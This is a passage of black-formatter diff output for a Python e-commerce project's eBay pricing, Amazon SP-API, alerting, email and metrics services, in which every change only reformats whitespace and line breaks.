             PricingStrategy.AUCTION_STYLE: Decimal("0.80"),
             PricingStrategy.BUY_IT_NOW: Decimal("1.05"),
-            PricingStrategy.BEST_OFFER: Decimal("1.10")
-        }
-        
+            PricingStrategy.BEST_OFFER: Decimal("1.10"),
+        }
+
         multiplier = strategy_multipliers.get(strategy, Decimal("1.0"))
         recommended_price = base_price * multiplier
-        
+
         # Adjust for fees to maintain target net proceeds
         if strategy in [PricingStrategy.PREMIUM, PricingStrategy.BUY_IT_NOW]:
             fee_adjustment = Decimal("1.15")  # Add 15% to cover fees and profit
             recommended_price *= fee_adjustment
-        
+
         # Round to reasonable precision
         return recommended_price.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
-    
+
     def _determine_listing_format(
         self,
         price: Decimal,
         competitive_analysis: Dict[str, Any],
-        product_attributes: Dict[str, Any]
+        product_attributes: Dict[str, Any],
     ) -> ListingFormat:
         """Determine optimal listing format."""
-        
+
         # High-value items often do better with auctions
         if price > Decimal("500"):
             return ListingFormat.AUCTION
-        
+
         # High saturation markets benefit from Buy It Now
         if competitive_analysis["market_saturation"] == "high":
             return ListingFormat.BUY_IT_NOW
-        
+
         # New items typically use Buy It Now
         if product_attributes.get("condition") == "new":
             return ListingFormat.BUY_IT_NOW
-        
+
         # Default to Buy It Now for simplicity
         return ListingFormat.BUY_IT_NOW
-    
+
     def _calculate_confidence_score(
         self,
         competitive_analysis: Dict[str, Any],
         market_data: Dict[str, Any],
-        strategy: PricingStrategy
+        strategy: PricingStrategy,
     ) -> float:
         """Calculate confidence score for pricing recommendation."""
-        
+
         base_confidence = 0.7
-        
+
         # Adjust based on market data quality
         if market_data.get("sold_listings_30_days", 0) > 20:
             base_confidence += 0.1
-        
+
         # Adjust based on competition level
         if competitive_analysis["market_saturation"] == "low":
             base_confidence += 0.1
         elif competitive_analysis["market_saturation"] == "high":
             base_confidence -= 0.1
-        
+
         # Adjust based on strategy certainty
         if strategy in [PricingStrategy.COMPETITIVE, PricingStrategy.BUY_IT_NOW]:
             base_confidence += 0.05
-        
+
         return min(0.95, max(0.5, base_confidence))
-    
+
     def _get_competitive_adjustments(self, position: str, saturation: str) -> List[str]:
         """Get competitive adjustment recommendations."""
         adjustments = []
-        
+
         if position == "above_market":
             adjustments.append("Consider reducing price to improve competitiveness")
         elif position == "below_market":
             adjustments.append("Price may be too low - consider increasing")
-        
+
         if saturation == "high":
             adjustments.append("High competition - focus on differentiation")
             adjustments.append("Consider promoted listings for visibility")
         elif saturation == "low":
             adjustments.append("Low competition - opportunity for premium pricing")
-        
+
         return adjustments
-    
+
     def _assess_market_opportunity(
-        self, 
-        market_data: Dict[str, Any], 
-        base_price: Decimal
+        self, market_data: Dict[str, Any], base_price: Decimal
     ) -> str:
         """Assess market opportunity level."""
-        
-        sold_ratio = (
-            market_data.get("sold_listings_30_days", 0) / 
-            max(market_data.get("active_listings", 1), 1)
+
+        sold_ratio = market_data.get("sold_listings_30_days", 0) / max(
+            market_data.get("active_listings", 1), 1
         )
-        
+
         if sold_ratio > 0.7:
             return "high"
         elif sold_ratio > 0.4:
             return "moderate"
         else:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_pricing.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/alert_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/alert_service.py	2025-06-19 04:04:10.455007+00:00
@@ -16,21 +16,27 @@
 from typing import Dict, List, Optional, Any, Set
 from sqlalchemy import and_, desc, func, select
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from fs_agt_clean.database.models.metrics import (
-    AlertRecord, MetricThreshold, MetricDataPoint,
-    AlertLevel, AlertCategory, AlertSource
+    AlertRecord,
+    MetricThreshold,
+    MetricDataPoint,
+    AlertLevel,
+    AlertCategory,
+    AlertSource,
 )
 from fs_agt_clean.core.db.database import Database
 from fs_agt_clean.core.monitoring.alerts.alert_manager import AlertManager, Alert
 
 
 class EnhancedAlertService:
     """Enhanced alert service with database persistence."""
 
-    def __init__(self, database: Database, alert_manager: Optional[AlertManager] = None):
+    def __init__(
+        self, database: Database, alert_manager: Optional[AlertManager] = None
+    ):
         """Initialize the enhanced alert service.
 
         Args:
             database: Database instance for data operations
             alert_manager: Optional alert manager for in-memory operations
@@ -56,11 +62,11 @@
         category: AlertCategory = AlertCategory.SYSTEM,
         source: AlertSource = AlertSource.SYSTEM,
         details: Optional[Dict[str, Any]] = None,
         labels: Optional[Dict[str, str]] = None,
         correlation_id: Optional[str] = None,
-        auto_resolve_minutes: Optional[int] = None
+        auto_resolve_minutes: Optional[int] = None,
     ) -> Optional[str]:
         """Create and store an alert.
 
         Args:
             title: Alert title
@@ -102,11 +108,11 @@
                 source=source,
                 details=details,
                 labels=labels,
                 correlation_id=correlation_id,
                 fingerprint=fingerprint,
-                timestamp=datetime.now(timezone.utc)
+                timestamp=datetime.now(timezone.utc),
             )
 
             session.add(alert_record)
             await session.commit()
             await session.refresh(alert_record)
@@ -124,31 +130,28 @@
                 category=category,
                 source=source,
                 details=details,
                 labels=labels,
                 alert_id=alert_id,
-                correlation_id=correlation_id
+                correlation_id=correlation_id,
             )
             await self.alert_manager.create_alert(
                 title=title,
                 message=message,
                 level=level,
                 category=category,
                 source=source,
                 details=details,
                 labels=labels,
-                correlation_id=correlation_id
+                correlation_id=correlation_id,
             )
 
         self.logger.info(f"Created alert: {alert_id} - {title}")
         return alert_id
 
     async def acknowledge_alert(
-        self,
-        alert_id: str,
-        acknowledged_by: str,
-        notes: Optional[str] = None
+        self, alert_id: str, acknowledged_by: str, notes: Optional[str] = None
     ) -> bool:
         """Acknowledge an alert.
 
         Args:
             alert_id: Alert ID to acknowledge
@@ -184,14 +187,11 @@
 
             self.logger.info(f"Acknowledged alert: {alert_id} by {acknowledged_by}")
             return True
 
     async def resolve_alert(
-        self,
-        alert_id: str,
-        resolved_by: str,
-        resolution_notes: Optional[str] = None
+        self, alert_id: str, resolved_by: str, resolution_notes: Optional[str] = None
     ) -> bool:
         """Resolve an alert.
 
         Args:
             alert_id: Alert ID to resolve
@@ -231,11 +231,11 @@
         source: Optional[AlertSource] = None,
         acknowledged: Optional[bool] = None,
         resolved: Optional[bool] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Dict[str, Any]]:
         """Retrieve alerts with filtering.
 
         Args:
             level: Optional level filter
@@ -278,13 +278,11 @@
             alerts = result.scalars().all()
 
             return [alert.to_dict() for alert in alerts]
 
     async def get_alert_summary(
-        self,
-        start_time: Optional[datetime] = None,
-        end_time: Optional[datetime] = None
+        self, start_time: Optional[datetime] = None, end_time: Optional[datetime] = None
     ) -> Dict[str, Any]:
         """Get alert summary statistics.
 
         Args:
             start_time: Optional start time filter
@@ -301,73 +299,72 @@
         async with self.database.get_session_context() as session:
             # Total alerts
             total_query = select(func.count(AlertRecord.id)).where(
                 and_(
                     AlertRecord.timestamp >= start_time,
-                    AlertRecord.timestamp <= end_time
+                    AlertRecord.timestamp <= end_time,
                 )
             )
             total_result = await session.execute(total_query)
             total_alerts = total_result.scalar() or 0
 
             # Alerts by level
-            level_query = select(
-                AlertRecord.level,
-                func.count(AlertRecord.id)
-            ).where(
-                and_(
-                    AlertRecord.timestamp >= start_time,
-                    AlertRecord.timestamp <= end_time
-                )
-            ).group_by(AlertRecord.level)
+            level_query = (
+                select(AlertRecord.level, func.count(AlertRecord.id))
+                .where(
+                    and_(
+                        AlertRecord.timestamp >= start_time,
+                        AlertRecord.timestamp <= end_time,
+                    )
+                )
+                .group_by(AlertRecord.level)
+            )
 
             level_result = await session.execute(level_query)
-            alerts_by_level = {level.value: count for level, count in level_result.fetchall()}
+            alerts_by_level = {
+                level.value: count for level, count in level_result.fetchall()
+            }
 
             # Acknowledged alerts
             ack_query = select(func.count(AlertRecord.id)).where(
                 and_(
                     AlertRecord.timestamp >= start_time,
                     AlertRecord.timestamp <= end_time,
-                    AlertRecord.acknowledged == True
+                    AlertRecord.acknowledged == True,
                 )
             )
             ack_result = await session.execute(ack_query)
             acknowledged_alerts = ack_result.scalar() or 0
 
             # Resolved alerts
             resolved_query = select(func.count(AlertRecord.id)).where(
                 and_(
                     AlertRecord.timestamp >= start_time,
                     AlertRecord.timestamp <= end_time,
-                    AlertRecord.resolved == True
+                    AlertRecord.resolved == True,
                 )
             )
             resolved_result = await session.execute(resolved_query)
             resolved_alerts = resolved_result.scalar() or 0
 
             return {
                 "time_period": {
                     "start_time": start_time.isoformat(),
                     "end_time": end_time.isoformat(),
-                    "duration_hours": (end_time - start_time).total_seconds() / 3600
+                    "duration_hours": (end_time - start_time).total_seconds() / 3600,
                 },
                 "summary": {
                     "total_alerts": total_alerts,
                     "acknowledged_alerts": acknowledged_alerts,
                     "resolved_alerts": resolved_alerts,
                     "unresolved_alerts": total_alerts - resolved_alerts,
-                    "alerts_by_level": alerts_by_level
-                }
+                    "alerts_by_level": alerts_by_level,
+                },
             }
 
     def _generate_fingerprint(
-        self,
-        title: str,
-        message: str,
-        level: AlertLevel,
-        category: AlertCategory
+        self, title: str, message: str, level: AlertLevel, category: AlertCategory
     ) -> str:
         """Generate a fingerprint for alert deduplication.
 
         Args:
             title: Alert title
@@ -391,21 +388,25 @@
             True if should be deduplicated, False otherwise
         """
         # Check in-memory cache first
         if fingerprint in self._recent_alerts:
             last_time = self._recent_alerts[fingerprint]
-            if datetime.now(timezone.utc) - last_time < timedelta(minutes=self.dedup_window_minutes):
+            if datetime.now(timezone.utc) - last_time < timedelta(
+                minutes=self.dedup_window_minutes
+            ):
                 return True
 
         # Check database for recent similar alerts
-        cutoff_time = datetime.now(timezone.utc) - timedelta(minutes=self.dedup_window_minutes)
+        cutoff_time = datetime.now(timezone.utc) - timedelta(
+            minutes=self.dedup_window_minutes
+        )
 
         async with self.database.get_session_context() as session:
             query = select(func.count(AlertRecord.id)).where(
                 and_(
                     AlertRecord.fingerprint == fingerprint,
-                    AlertRecord.timestamp >= cutoff_time
+                    AlertRecord.timestamp >= cutoff_time,
                 )
             )
             result = await session.execute(query)
             count = result.scalar() or 0
 
@@ -424,17 +425,19 @@
         current_count = self._alert_counts.get(fingerprint, 0)
         if current_count >= self.max_alerts_per_window:
             return True
 
         # Check database for recent alerts of same type
-        cutoff_time = datetime.now(timezone.utc) - timedelta(minutes=self.rate_limit_window_minutes)
+        cutoff_time = datetime.now(timezone.utc) - timedelta(
+            minutes=self.rate_limit_window_minutes
+        )
 
         async with self.database.get_session_context() as session:
             query = select(func.count(AlertRecord.id)).where(
                 and_(
                     AlertRecord.fingerprint == fingerprint,
-                    AlertRecord.timestamp >= cutoff_time
+                    AlertRecord.timestamp >= cutoff_time,
                 )
             )
             result = await session.execute(query)
             count = result.scalar() or 0
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/alert_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/service.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/service.py	2025-06-19 04:04:10.516364+00:00
@@ -43,13 +43,16 @@
         self.region = "NA"  # Default to North America
 
         # Validate credentials
         if not all([self.client_id, self.client_secret, self.refresh_token]):
             missing = []
-            if not self.client_id: missing.append("LWA_APP_ID")
-            if not self.client_secret: missing.append("LWA_CLIENT_SECRET")
-            if not self.refresh_token: missing.append("SP_API_REFRESH_TOKEN")
+            if not self.client_id:
+                missing.append("LWA_APP_ID")
+            if not self.client_secret:
+                missing.append("LWA_CLIENT_SECRET")
+            if not self.refresh_token:
+                missing.append("SP_API_REFRESH_TOKEN")
             raise ValueError(f"Missing Amazon SP-API credentials: {', '.join(missing)}")
 
         # Set base URL based on region
         base_url = self._get_endpoint_for_region(self.region)
         super().__init__(base_url)
@@ -79,11 +82,13 @@
             "token_refreshes": 0,
             "last_call_time": None,
             "last_error": None,
         }
 
-        logger.info(f"Amazon SP-API service initialized for marketplace {self.marketplace_id}")
+        logger.info(
+            f"Amazon SP-API service initialized for marketplace {self.marketplace_id}"
+        )
 
     def _get_endpoint_for_region(self, region: str) -> str:
         """Get the SP-API endpoint for the specified region."""
         region_endpoints = {
             "NA": "https://sellingpartnerapi-na.amazon.com",
@@ -119,11 +124,13 @@
                 ) as response:
                     if response.status != 200:
                         error_text = await response.text()
                         logger.error(f"Failed to get SP-API access token: {error_text}")
                         self.service_metrics["failed_calls"] += 1
-                        self.service_metrics["last_error"] = f"Token refresh failed: {error_text}"
+                        self.service_metrics["last_error"] = (
+                            f"Token refresh failed: {error_text}"
+                        )
                         raise AuthenticationError(
                             f"SP-API auth failed with status {response.status}: {error_text}",
                             marketplace="amazon",
                             status_code=response.status,
                         )
@@ -154,11 +161,13 @@
         self.service_metrics["api_calls"] += 1
         self.service_metrics["last_call_time"] = datetime.now()
 
         # Get semaphore for rate limiting
         endpoint_category = endpoint.split("/")[1] if "/" in endpoint else "default"
-        semaphore = self._request_semaphores.get(endpoint_category, self._request_semaphores["catalog"])
+        semaphore = self._request_semaphores.get(
+            endpoint_category, self._request_semaphores["catalog"]
+        )
 
         SP_API_REQUEST_COUNT.labels(endpoint=endpoint).inc()
 
         try:
             # Get access token
@@ -183,19 +192,30 @@
                         json=json_data,
                     ) as response:
                         response_text = await response.text()
 
                         if response.status >= 400:
-                            logger.error(f"SP-API request failed: {response.status} - {response_text}")
+                            logger.error(
+                                f"SP-API request failed: {response.status} - {response_text}"
+                            )
                             self.service_metrics["failed_calls"] += 1
-                            self.service_metrics["last_error"] = f"API call failed: {response_text}"
-
-                            SP_API_ERROR_COUNT.labels(error_type=f"http_{response.status}").inc()
+                            self.service_metrics["last_error"] = (
+                                f"API call failed: {response_text}"
+                            )
+
+                            SP_API_ERROR_COUNT.labels(
+                                error_type=f"http_{response.status}"
+                            ).inc()
 
                             # Retry on certain errors
-                            if response.status in [429, 500, 502, 503, 504] and max_retries > 0:
-                                await asyncio.sleep(2 ** (3 - max_retries))  # Exponential backoff
+                            if (
+                                response.status in [429, 500, 502, 503, 504]
+                                and max_retries > 0
+                            ):
+                                await asyncio.sleep(
+                                    2 ** (3 - max_retries)
+                                )  # Exponential backoff
                                 return await self._execute_sp_api(
                                     endpoint=endpoint,
                                     method=method,
                                     params=params,
                                     json_data=json_data,
@@ -257,26 +277,34 @@
         }
 
         if sku:
             params["sellerSkus"] = sku
 
-        return await self._execute_sp_api("/fba/inventory/v1/summaries", "GET", params=params)
+        return await self._execute_sp_api(
+            "/fba/inventory/v1/summaries", "GET", params=params
+        )
 
     async def get_product_catalog(
         self, asin: Optional[str] = None, keywords: Optional[str] = None
     ) -> Dict[str, Any]:
         """Get product catalog information."""
-        params = {"marketplaceIds": self.marketplace_id}  # Fixed: use marketplaceIds (plural)
+        params = {
+            "marketplaceIds": self.marketplace_id
+        }  # Fixed: use marketplaceIds (plural)
 
         if asin:
             params["asin"] = asin
         if keywords:
             params["keywords"] = keywords
 
-        return await self._execute_sp_api("/catalog/2022-04-01/items", "GET", params=params)
-
-    async def create_listing(self, sku: str, listing_data: Dict[str, Any]) -> Dict[str, Any]:
+        return await self._execute_sp_api(
+            "/catalog/2022-04-01/items", "GET", params=params
+        )
+
+    async def create_listing(
+        self, sku: str, listing_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Create a new product listing."""
         request_body = {
             "productType": listing_data.get("productType", "PRODUCT"),
             "requirements": listing_data.get("requirements", "LISTING"),
             "attributes": listing_data.get("attributes", {}),
@@ -361,11 +389,14 @@
             # Quick health check - just verify token can be obtained
             await self._get_access_token()
 
             success_rate = 0.0
             if self.service_metrics["api_calls"] > 0:
-                success_rate = self.service_metrics["successful_calls"] / self.service_metrics["api_calls"]
+                success_rate = (
+                    self.service_metrics["successful_calls"]
+                    / self.service_metrics["api_calls"]
+                )
 
             status = "healthy"
             if success_rate < 0.8:
                 status = "degraded"
             elif success_rate < 0.5:
@@ -395,19 +426,27 @@
         # Extract data from SP-API response structure
         items = product_data.get("payload", {}).get("items", [])
         item_data = items[0] if items else {}
 
         # Extract inventory data
-        inventory_summaries = inventory_data.get("payload", {}).get("inventorySummaries", [])
+        inventory_summaries = inventory_data.get("payload", {}).get(
+            "inventorySummaries", []
+        )
         inventory_summary = inventory_summaries[0] if inventory_summaries else {}
 
         return {
             "asin": asin,
             "title": item_data.get("summaries", [{}])[0].get("itemName", ""),
-            "brand": item_data.get("attributes", {}).get("brand", [{}])[0].get("value", ""),
-            "category": item_data.get("summaries", [{}])[0].get("browseClassification", {}).get("displayName", "Unknown"),
-            "description": item_data.get("attributes", {}).get("item_description", [{}])[0].get("value", ""),
+            "brand": item_data.get("attributes", {})
+            .get("brand", [{}])[0]
+            .get("value", ""),
+            "category": item_data.get("summaries", [{}])[0]
+            .get("browseClassification", {})
+            .get("displayName", "Unknown"),
+            "description": item_data.get("attributes", {})
+            .get("item_description", [{}])[0]
+            .get("value", ""),
             "features": item_data.get("attributes", {}).get("bullet_point", []),
             "images": [img.get("link") for img in item_data.get("images", [])],
             "pricing": {
                 "currency": "USD",
                 "last_updated": datetime.now(),
@@ -418,11 +457,13 @@
                 "fulfillment_type": inventory_summary.get("fulfillmentType", "FBA"),
                 "last_updated": datetime.now(),
             },
             "metrics": {
                 "sales_rank": item_data.get("salesRanks", [{}])[0].get("rank"),
-                "category": item_data.get("summaries", [{}])[0].get("browseClassification", {}).get("displayName"),
+                "category": item_data.get("summaries", [{}])[0]
+                .get("browseClassification", {})
+                .get("displayName"),
                 "last_updated": datetime.now(),
             },
         }
 
     async def record_pipeline_error(self, stage: str, error: Exception):
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/amazon/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/email_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/email_service.py	2025-06-19 04:04:10.586621+00:00
@@ -16,61 +16,75 @@
 from typing import Dict, Optional
 
 # Optional email dependencies
 try:
     import aiosmtplib
+
     AIOSMTPLIB_AVAILABLE = True
 except ImportError:
     AIOSMTPLIB_AVAILABLE = False
+
     # Create mock for graceful fallback
     class MockSMTP:
         def __init__(self, *args, **kwargs):
             pass
+
         async def connect(self):
             pass
+
         async def login(self, *args):
             pass
+
         async def send_message(self, *args):
             pass
+
         async def quit(self):
             pass
-    aiosmtplib = type('MockModule', (), {'SMTP': MockSMTP})()
+
+    aiosmtplib = type("MockModule", (), {"SMTP": MockSMTP})()
 
 try:
     from jinja2 import Environment, PackageLoader, select_autoescape
+
     JINJA2_AVAILABLE = True
 except ImportError:
     JINJA2_AVAILABLE = False
+
     # Create mock classes for graceful fallback
     class Environment:
         def __init__(self, *args, **kwargs):
             pass
+
         def from_string(self, template):
             return MockTemplate(template)
 
     class MockTemplate:
         def __init__(self, template):
             self.template = template
+
         def render(self, **kwargs):
             return self.template.format(**kwargs)
 
     def PackageLoader(*args, **kwargs):
         return None
 
     def select_autoescape(*args, **kwargs):
         return None
+
 
 # Optional config manager
 try:
     from fs_agt_clean.core.config.manager import ConfigManager
 except ImportError:
     # Create mock ConfigManager for graceful fallback
     class ConfigManager:
         def __init__(self):
             self._config = {}
+
         def get(self, key, default=None):
             return self._config.get(key, default)
+
 
 logger = logging.getLogger(__name__)
 
 
 class EmailTemplate:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/email_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_service.py	2025-06-19 04:04:10.593509+00:00
@@ -14,12 +14,20 @@
 from typing import Dict, List, Optional, Any, Tuple
 from sqlalchemy import and_, desc, func, select
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from fs_agt_clean.database.models.metrics import (
-    MetricDataPoint, SystemMetrics, AgentMetrics, AlertRecord, MetricThreshold,
-    MetricType, MetricCategory, AlertLevel, AlertCategory, AlertSource
+    MetricDataPoint,
+    SystemMetrics,
+    AgentMetrics,
+    AlertRecord,
+    MetricThreshold,
+    MetricType,
+    MetricCategory,
+    AlertLevel,
+    AlertCategory,
+    AlertSource,
 )
 from fs_agt_clean.core.db.database import Database
 
 
 class MetricsService:
@@ -41,11 +49,11 @@
         metric_type: MetricType = MetricType.GAUGE,
         category: MetricCategory = MetricCategory.SYSTEM,
         labels: Optional[Dict[str, str]] = None,
         agent_id: Optional[str] = None,
         service_name: Optional[str] = None,
-        timestamp: Optional[datetime] = None
+        timestamp: Optional[datetime] = None,
     ) -> str:
         """Store a single metric data point.
 
         Args:
             name: Metric name
@@ -67,11 +75,11 @@
                 type=metric_type,
                 category=category,
                 labels=labels,
                 agent_id=agent_id,
                 service_name=service_name,
-                timestamp=timestamp or datetime.now(timezone.utc)
+                timestamp=timestamp or datetime.now(timezone.utc),
             )
 
             session.add(metric)
             await session.commit()
             await session.refresh(metric)
@@ -96,11 +104,11 @@
         process_memory_vms: Optional[int] = None,
         process_num_threads: Optional[int] = None,
         process_num_fds: Optional[int] = None,
         hostname: Optional[str] = None,
         service_name: Optional[str] = None,
-        timestamp: Optional[datetime] = None
+        timestamp: Optional[datetime] = None,
     ) -> str:
         """Store system metrics snapshot.
 
         Args:
             Various system and process metrics
@@ -125,11 +133,11 @@
                 process_memory_rss=process_memory_rss,
                 process_memory_vms=process_memory_vms,
                 process_num_threads=process_num_threads,
                 process_num_fds=process_num_fds,
                 hostname=hostname,
-                service_name=service_name
+                service_name=service_name,
             )
 
             session.add(metrics)
             await session.commit()
             await session.refresh(metrics)
@@ -151,11 +159,11 @@
         avg_response_time_ms: Optional[float] = None,
         peak_response_time_ms: Optional[float] = None,
         cpu_usage_percent: Optional[float] = None,
         memory_usage_percent: Optional[float] = None,
         metadata: Optional[Dict[str, Any]] = None,
-        timestamp: Optional[datetime] = None
+        timestamp: Optional[datetime] = None,
     ) -> str:
         """Store agent metrics.
 
         Args:
             agent_id: Agent identifier
@@ -179,11 +187,11 @@
                 requests_failed=requests_failed,
                 avg_response_time_ms=avg_response_time_ms,
                 peak_response_time_ms=peak_response_time_ms,
                 cpu_usage_percent=cpu_usage_percent,
                 memory_usage_percent=memory_usage_percent,
-                agent_metadata=metadata
+                agent_metadata=metadata,
             )
 
             session.add(metrics)
             await session.commit()
             await session.refresh(metrics)
@@ -197,11 +205,11 @@
         category: Optional[MetricCategory] = None,
         agent_id: Optional[str] = None,
         service_name: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 1000
+        limit: int = 1000,
     ) -> List[Dict[str, Any]]:
         """Retrieve metric data points with filtering.
 
         Args:
             name: Optional metric name filter
@@ -246,11 +254,11 @@
     async def get_system_metrics_history(
         self,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
         service_name: Optional[str] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Dict[str, Any]]:
         """Retrieve system metrics history.
 
         Args:
             start_time: Optional start time filter
@@ -285,11 +293,11 @@
     async def get_agent_metrics_history(
         self,
         agent_id: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Dict[str, Any]]:
         """Retrieve agent metrics history.
 
         Args:
             agent_id: Optional agent ID filter
@@ -320,13 +328,11 @@
             metrics = result.scalars().all()
 
             return [metric.to_dict() for metric in metrics]
 
     async def get_metrics_summary(
-        self,
-        start_time: Optional[datetime] = None,
-        end_time: Optional[datetime] = None
+        self, start_time: Optional[datetime] = None, end_time: Optional[datetime] = None
     ) -> Dict[str, Any]:
         """Get a summary of metrics for the specified time period.
 
         Args:
             start_time: Optional start time filter
@@ -343,54 +349,56 @@
         async with self.database.get_session_context() as session:
             # Get total metric data points
             metric_count_query = select(func.count(MetricDataPoint.id)).where(
                 and_(
                     MetricDataPoint.timestamp >= start_time,
-                    MetricDataPoint.timestamp <= end_time
+                    MetricDataPoint.timestamp <= end_time,
                 )
             )
             metric_count_result = await session.execute(metric_count_query)
             total_metrics = metric_count_result.scalar() or 0
 
             # Get system metrics count
             system_count_query = select(func.count(SystemMetrics.id)).where(
                 and_(
                     SystemMetrics.timestamp >= start_time,
-                    SystemMetrics.timestamp <= end_time
+                    SystemMetrics.timestamp <= end_time,
                 )
             )
             system_count_result = await session.execute(system_count_query)
             system_metrics_count = system_count_result.scalar() or 0
 
             # Get agent metrics count
             agent_count_query = select(func.count(AgentMetrics.id)).where(
                 and_(
                     AgentMetrics.timestamp >= start_time,
-                    AgentMetrics.timestamp <= end_time
+                    AgentMetrics.timestamp <= end_time,
                 )
             )
             agent_count_result = await session.execute(agent_count_query)
             agent_metrics_count = agent_count_result.scalar() or 0
 
             # Get unique agents
-            unique_agents_query = select(func.count(func.distinct(AgentMetrics.agent_id))).where(
+            unique_agents_query = select(
+                func.count(func.distinct(AgentMetrics.agent_id))
+            ).where(
                 and_(
                     AgentMetrics.timestamp >= start_time,
-                    AgentMetrics.timestamp <= end_time
+                    AgentMetrics.timestamp <= end_time,
                 )
             )
             unique_agents_result = await session.execute(unique_agents_query)
             unique_agents = unique_agents_result.scalar() or 0
 
             return {
                 "time_period": {
                     "start_time": start_time.isoformat(),
                     "end_time": end_time.isoformat(),
-                    "duration_hours": (end_time - start_time).total_seconds() / 3600
+                    "duration_hours": (end_time - start_time).total_seconds() / 3600,
                 },
                 "metrics": {
                     "total_data_points": total_metrics,
                     "system_metrics_snapshots": system_metrics_count,
                     "agent_metrics_snapshots": agent_metrics_count,
-                    "unique_agents": unique_agents
-                }
+                    "unique_agents": unique_agents,
+                },
             }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/metrics_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_optimization.py	2025-06-14 20:35:30.839849+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/marketplace/ebay_optimization.py	2025-06-19 04:04:10.678079+00:00
@@ -12,27 +12,34 @@
 import logging
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Tuple
 from decimal import Decimal
 
-from fs_agt_clean.database.repositories.ai_analysis_repository import CategoryOptimizationRepository
-from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClient, SimpleLLMConfig as LLMConfig, ModelProvider, ModelType
+from fs_agt_clean.database.repositories.ai_analysis_repository import (
+    CategoryOptimizationRepository,
+)
+from fs_agt_clean.core.ai.simple_llm_client import (
+    SimpleLLMClient,
+    SimpleLLMConfig as LLMConfig,
+    ModelProvider,
+    ModelType,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class EbayCategory:
     """eBay category information and metadata."""
-    
+
     def __init__(
         self,
         category_id: str,
         category_name: str,
         parent_id: Optional[str] = None,
         level: int = 1,
         fees: Optional[Dict[str, float]] = None,
-        requirements: Optional[List[str]] = None
+        requirements: Optional[List[str]] = None,
     ):
         self.category_id = category_id
         self.category_name = category_name
         self.parent_id = parent_id
         self.level = level
@@ -40,19 +47,19 @@
         self.requirements = requirements or []
 
 
 class EbayPricingStrategy:
     """eBay-specific pricing strategy recommendations."""
-    
+
     def __init__(
         self,
         strategy_type: str,
         base_price: Decimal,
         suggested_price: Decimal,
         confidence: float,
         reasoning: str,
-        market_data: Dict[str, Any]
+        market_data: Dict[str, Any],
     ):
         self.strategy_type = strategy_type
         self.base_price = base_price
         self.suggested_price = suggested_price
         self.confidence = confidence
@@ -61,399 +68,427 @@
 
 
 class EbayOptimizationService:
     """
     eBay marketplace optimization service with platform-specific algorithms.
-    
+
     This service provides:
     - eBay category mapping and optimization
     - Platform-specific pricing strategies
     - Listing optimization for eBay's search algorithm
     - Performance prediction and analytics
     """
-    
+
     def __init__(self, llm_config: Optional[LLMConfig] = None):
         """Initialize the eBay optimization service."""
         self.llm_config = llm_config or LLMConfig(
-            provider=ModelProvider.OLLAMA,
-            model_type=ModelType.LLAMA3_1_8B
+            provider=ModelProvider.OLLAMA, model_type=ModelType.LLAMA3_1_8B
         )
         self.category_repository = CategoryOptimizationRepository()
-        
+
         # eBay-specific configuration
         self.ebay_config = {
             "max_title_length": 80,
             "max_description_length": 500000,  # 500KB
             "max_photos": 24,
             "listing_duration_options": [1, 3, 5, 7, 10, 30],
             "fee_structure": {
                 "insertion_fee": 0.35,
                 "final_value_fee_rate": 0.125,  # 12.5%
-                "store_subscription_discount": 0.05
-            }
-        }
-        
+                "store_subscription_discount": 0.05,
+            },
+        }
+
         # eBay category mapping (simplified for demo)
         self.category_mapping = self._initialize_category_mapping()
-        
+
         logger.info("eBay Optimization Service initialized")
-    
+
     def _initialize_category_mapping(self) -> Dict[str, EbayCategory]:
         """Initialize eBay category mapping with common categories."""
         categories = {
             "electronics": EbayCategory(
                 category_id="58058",
                 category_name="Cell Phones & Smartphones",
-                fees={"insertion": 0.35, "final_value": 0.125}
+                fees={"insertion": 0.35, "final_value": 0.125},
             ),
             "clothing": EbayCategory(
                 category_id="11450",
                 category_name="Clothing, Shoes & Accessories",
-                fees={"insertion": 0.35, "final_value": 0.125}
+                fees={"insertion": 0.35, "final_value": 0.125},
             ),
             "home_garden": EbayCategory(
                 category_id="11700",
                 category_name="Home & Garden",
-                fees={"insertion": 0.35, "final_value": 0.125}
+                fees={"insertion": 0.35, "final_value": 0.125},
             ),
             "collectibles": EbayCategory(
                 category_id="1",
                 category_name="Collectibles",
-                fees={"insertion": 0.35, "final_value": 0.125}
+                fees={"insertion": 0.35, "final_value": 0.125},
             ),
             "automotive": EbayCategory(
                 category_id="6000",
                 category_name="eBay Motors",
